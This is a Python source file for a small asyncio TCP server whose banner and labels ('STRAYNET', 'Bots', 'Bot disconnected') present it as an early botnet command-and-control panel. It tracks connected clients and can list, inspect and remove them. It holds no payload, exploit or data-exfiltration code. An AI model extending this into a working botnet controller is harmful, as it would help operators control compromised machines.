import asyncio
import aioconsole
import os
import sys
import platform
from rich.console import Console

HOST = "0.0.0.0"
PORT = 8888

console = Console(highlight=False)
server:asyncio.Server = None

prompt_prefix = "server:~$ "
title = r"""
███████╗████████╗██████╗  █████╗ ██╗   ██╗███╗   ██╗███████╗████████╗
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗ ██╔╝████╗  ██║██╔════╝╚══██╔══╝
███████╗   ██║   ██████╔╝███████║ ╚████╔╝ ██╔██╗ ██║█████╗     ██║   
╚════██║   ██║   ██╔══██╗██╔══██║  ╚██╔╝  ██║╚██╗██║██╔══╝     ██║   
███████║   ██║   ██║  ██║██║  ██║   ██║   ██║ ╚████║███████╗   ██║   
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝
                      [cyan]Created by User ;) ~ v1[/cyan]     
"""

class Client():
    def __init__(self, id:str=None, ip:str=None, writer:asyncio.StreamWriter=None):
        self.id = id
        self.ip = ip
        self.writer = writer

clients: list[Client] = []

def clear_screen():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def get_client_from_id(input_id:int):
    try:
        for c in clients:
            if int(c.id) == int(input_id):
                return c
    except:
        console.print("[red](-)Client wasn't found[/red]")

#? The main part of the program, from here the user will control everything (commands, bots, etc)
async def main_gui():
    clear_screen()
    console.print(f"[bright_red]{title}[/bright_red]")
    console.print(f"[bright_red]Server started on:[/bright_red] [cyan]{HOST}:{PORT}[/cyan]")
    console.print("[bright_red]- [cyan]'help'[/cyan] for help[/bright_red]\n")
    
    while True:
        command = await aioconsole.ainput(f"\n{prompt_prefix}")
        await parse_command(command)

#? Parse commands to client
async def parse_command(command:str):
    try:
        tokens = command.split()
        if not tokens:
            console.print("[red](-)No command was input[/red]")
        
        command = tokens[0]
        if command == "help":
            console.print("[INSERT HELP]")
        elif command == "clear":
            clear_screen()
            console.print(f"[bright_red]{title}[/bright_red]")
            console.print(f"[bright_red]Server started on:[/bright_red] [cyan]{HOST}:{PORT}[/cyan]")
            console.print("[bright_red]- [cyan]'help'[/cyan] for help[/bright_red]\n")
        elif command == "list":
            await list_clients()
        elif command == "info":
            await get_info(tokens)
        elif command == "remove":
            await do_remove(tokens)
        elif command == "quit":
            sys.exit()
        else:
            console.print("[red](-)Command not found![/red]")
    except:
        pass

#? Prints out a list of all connected clients
async def list_clients():
    console.print(f"[cyan]Bots: {len(clients)}")
    for c in clients:
        console.print(f"[cyan]ID: {c.id}    IP: {c.ip}[/cyan]")

#? Prints info on the client, such as ip, os, etc
async def get_info(tokens:list):
    try:
        client = get_client_from_id(str(tokens[tokens.index("-id") + 1]))
        
        console.print(f"[cyan]Client ID: {client.id}[/cyan]")
        console.print(f"[cyan]IP: {client.ip}[/cyan]")
    except (ValueError, IndexError):
        console.print("[red]Formatting error: 'interact -id (USER_ID)'[/red]")

#? Remove the client from the server
async def do_remove(tokens:list):
    try:
        client = get_client_from_id(str(tokens[tokens.index("-id") + 1]))
        client.writer.close()
        console.print("[cyan]Removed user[cyan]")
    except (ValueError, IndexError):
        console.print("[red]Formatting error: 'remove -id (USER_ID)'[/red]")
    
#? Gets called whenever a client connects
async def handle_client(reader:asyncio.StreamReader, writer:asyncio.StreamWriter):
    try:
        id = len(clients) + 1
        ip = writer.get_extra_info("peername")
        client = Client(id, ip, writer)
        clients.append(client)
        await writer.wait_closed()
    except (asyncio.CancelledError, ConnectionRefusedError, asyncio.exceptions.IncompleteReadError, ConnectionResetError):
        pass
    except Exception as e:
        console.print("Bot disconnected")
    finally:
        clients.remove(client)
        writer.close()
        
#? Start server + keep it going forever
async def start_server():
    global server
    server = await asyncio.start_server(handle_client, HOST, PORT)
    await asyncio.gather(main_gui(), server.serve_forever())
    
async def start_screen():
    try:
        clear_screen()
        console.print(f"[bright_red]{title}[/bright_red]\n")
        console.print("[bright_red]COMMANDS:\n- [cyan]'start'[/cyan] starts server\n- [cyan]'exit'[/cyan] exits the program[/bright_red]")
        while True:
            user_input:str = input(f"\n{prompt_prefix}").lower()
            
            if user_input == "start":
                await start_server()
            elif user_input == "exit":
                sys.exit()
            else:
                console.print("[red](-)Command does not exist[/red]")
    except:
        pass
    
if __name__ == "__main__":
    try:
        asyncio.run(start_screen())
    except:
        pass